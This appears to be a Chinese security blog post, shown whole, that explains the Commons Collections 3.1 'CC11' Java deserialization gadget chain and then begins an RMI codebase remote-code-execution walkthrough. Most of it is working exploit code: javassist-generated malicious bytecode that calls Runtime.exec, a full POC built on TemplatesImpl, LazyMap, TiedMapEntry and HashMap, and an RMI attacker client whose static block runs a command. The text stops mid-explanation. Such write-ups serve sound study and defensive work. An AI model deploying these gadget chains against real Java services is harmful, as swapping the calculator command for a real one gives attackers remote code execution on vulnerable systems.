<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CommonsCollections11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="恶意class字节码编写"><a href="#恶意class字节码编写" class="headerlink" title="恶意class字节码编写"></a>恶意class字节码编写</h4><p>每个ctClass代表我们要修改的class，因此我们在classPool中创建一个名叫Evil的CtClass</p>
<p>通过静态代码块，插入执行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//</span></span><br><span class="line">cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//</span></span><br><span class="line"><span class="type">byte</span>[] evilbytes = cc.toBytecode();<span class="comment">//恶意字节码</span></span><br></pre></td></tr></table></figure>

<h4 id="TemplatesImpl加载恶意class"><a href="#TemplatesImpl加载恶意class" class="headerlink" title="TemplatesImpl加载恶意class"></a>TemplatesImpl加载恶意class</h4><p>在TemplateImpl中查找<code>defineClass</code>关键字，因为我们知道ClassLoader就是通过方法**defineClass()**来加载字节码的。</p>
<p>通过以下图可知，我们可以传入一个<code>_tfactory</code>的值(new一个它Class的新对象就可以)和<code>_bytecodes</code>（恶意字节码），然后再让获取到的loader来call它的defineClass()，从而将我们的字节码加载进jvm</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151143793.png" alt="image-20220102151143793"></p>
<p>上面的流程是在defineTransletClasses()里的，接下来我们要找到什么地方调用了defineTransletClasses()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151651096.png" alt="image-20220102151651096"></p>
<p>发现**getTransletInstance()<strong>调用了</strong>defineTranslateClasses()**，同时如果我们要使用该方法，需要让<code>_name</code>不为空，<code>_class</code>为空</p>
<p><strong>newTransformer()<strong>调用了</strong>getTransletInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152313976.png" alt="image-20220102152313976"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152422839.png" alt="image-20220102152422839"></p>
<p><strong>getOutputProperties()<strong>调用了</strong>newTransformer()</strong></p>
<p>因此TemplateImpl执行顺序如下</p>
<blockquote>
<p>getOutputProperties-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTranslateClasses()-&gt;defineClass()</p>
</blockquote>
<p>那么其实只要找到调用TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()的地方就可以连接上了。</p>
<p>我们先编写一些TemplatesImpl的部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/*配置TemplatesImpl - 加载恶意class到jvm*/</span></span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">      bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilbytes&#125;);<span class="comment">//这里传入的evilbytes需要在byte[][]中</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">      name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      name.set(templates,<span class="string">&quot;LeiHello&quot;</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">      tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发</span></span><br></pre></td></tr></table></figure>

<h4 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>已知TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()任意一个方法被调用都可以触发。这里我们以<code>newTrasnformer()</code>为例</p>
<p>看一下调用的情况:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102154928181.png" alt="image-20220102154928181"></p>
<p>在之前的cc3中已经分析过了<code>TrAXFilter()</code>的调用，在cc11里我们不再使用该链。</p>
<p>还记得InvokerTransformer吗，它是在commons-collections 3.1版本中存在的最为经常被使用的一个类。我们可以使用该类call任意方法。</p>
<p>再来回顾一下<strong>InvokerTransformer#transform</strong>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102155548083.png" alt="image-20220102155548083"></p>
<p>因此我们可以这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>在之前对cc链的分析中，后续的利用导致在生成payload阶段就触发了执行，因此我们在这里应该先随意写一个method作为占位，之后再进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>接下来寻找调用invokerTransformer#transform的方法，同时能够传入input=<code>templates</code>(我们的恶意class)</p>
<h4 id="LazyMap-2"><a href="#LazyMap-2" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>这里不再像之前的cc链一样使用ChainedTransformer，相反我们使用LazyMap来继续完成这个链。LazyMap有一个get()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//这里执行了transform方法</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果this.factory为invokerTransformer，则当LazyMap#get被调用的时候，命令可以执行。</p>
<p>所以需要构造LazyMap</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102162535035.png" alt="image-20220102162535035"></p>
<p>可以直接通过decorate方法来构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, invokerTransformer);</span><br></pre></td></tr></table></figure>

<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>现在需要找到一个Class能够调用LazyMap#get()方法，我们找到了<strong>TiedMapEntry</strong></p>
<p>在TiedMapEntry#get()处调用了getValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时hashCode方法调用了getValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这样写：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br></pre></td></tr></table></figure>



<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>为了调用TiedMapEntry#hashCode方法，可以利用HashMap的反序列化操作。</p>
<p>在HashMap中，它有自己的<strong>readObject()方法</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102165724308.png" alt="image-20220102165724308"></p>
<p>首先会反序列化HashMap中的key和value</p>
<p>在最后一行，调用了hash(key)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hash方法中调用了key.hashCode()</p>
<p>因此，如果我们将之前的tiedMapEntry放入hashMap的key中，就能触发整个利用链了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;helloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="改写InvokerTransformer"><a href="#改写InvokerTransformer" class="headerlink" title="改写InvokerTransformer"></a>改写InvokerTransformer</h4><p>记得前面我们只是添加了在InvokerTransformer中添加了占位符号，下面需要改一下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.clear();<span class="comment">//需要把lazyMap中我们之前加入的没用的map给移除</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">iMethodName</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iMethodName.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="POC构造-3"><a href="#POC构造-3" class="headerlink" title="POC构造"></a>POC构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, CannotCompileException, NotFoundException, IOException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/*构造恶意字节码*/</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//</span></span><br><span class="line">        <span class="type">byte</span>[] evilbytes = cc.toBytecode();<span class="comment">//恶意字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*配置TemplatesImpl - 加载恶意class到jvm*/</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilbytes&#125;);<span class="comment">//这里传入的evilbytes需要在byte[][]中</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;LeiHello&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*构造invokerTransformer来调用newTransformer()方法*/</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, invokerTransformer);<span class="comment">//需要把lazyMap中我们之前加入的没用的map给移除</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*利用HashMap反序列化中的hash(key)方法，触发利用链*/</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;helloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iMethodName</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashMap);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102172023830.png" alt="image-20220102172023830"></p>
<p>另一版本的POC我也放在仓库**<a href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a>**上了（流程是一样的，不过是提取了一些方法，看起来更简洁一些）</p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>终于学完了cc链，收获非常多，尤其是对java反射、代理和利用链的构造思路有了更深的理解。也非常感谢网上各位师傅无私的共享，才能让我看到这么精彩的分析。</p>
<h1 id="RMI反序列化漏洞"><a href="#RMI反序列化漏洞" class="headerlink" title="RMI反序列化漏洞"></a>RMI反序列化漏洞</h1><h2 id="RMI前置知识"><a href="#RMI前置知识" class="headerlink" title="RMI前置知识"></a>RMI前置知识</h2><p><a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a></p>
<h2 id="Codebase远程命令执行"><a href="#Codebase远程命令执行" class="headerlink" title="Codebase远程命令执行"></a>Codebase远程命令执行</h2><h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>在有些环境条件下，我们需要远程加载一些本地不存在的类，而<code>codebase</code>便是用来告诉JAVA应该从哪里远程加载本地不存在的类。</p>
<p>codebase可以是http, ftp这样的url地址，例如当我们加载<strong>example</strong>类时，Java发现本地并不存在这样的类，它就会去codebase指向的地址搜索下载<strong>example</strong>类并加载。</p>
<p>如果codebase是可控的，那么我们就可以让服务器恶意加载我们的攻击类（这个类在服务器上并不存在）。</p>
<p>Java官方自然注意到了这一点，于是采用了一些安全措施，让我们不能随意远程加载类，如果我们一定要加载远程类，需要满足以下条件：</p>
<ul>
<li>Server安装并配置了<strong>SecurityManager</strong></li>
<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code><ul>
<li>useCodebaseOnly参数在7u21、6u45版本之后默认设置为<strong>true</strong>，表示Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</li>
</ul>
</li>
</ul>
<p>该漏洞利用条件苛刻，因此少有人对此进行深入研究，P神在<strong>JAVA安全漫谈</strong>中提到了该漏洞，我在复现的时候遇到了很多坑，网上的大部分资料细节都交代得不清不楚，很难弄懂，单单是这个漏洞就花了我很长时间去复现，此文将详细讲解原理，希望能够帮大家弄懂每一步。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="被攻击方"><a href="#被攻击方" class="headerlink" title="被攻击方"></a>被攻击方</h4><p><strong>RemoteRMIServer.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;<span class="comment">//设置SecurityManager</span></span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);<span class="comment">//绑定service Calc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ICalc.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;<span class="comment">//功能接口</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Calc.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;<span class="comment">//实现功能</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p><strong>RMIClient</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* static 方法里是我们的恶意执行代码 */</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;<span class="comment">//同样需要安装SecurityManager</span></span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<span class="comment">//查找Registry上的refObj service</span></span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));<span class="comment">//这里调用了远程方法的sum(),并传入了li对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>为什么RMIClient这样写就能触发漏洞呢？</strong></p>
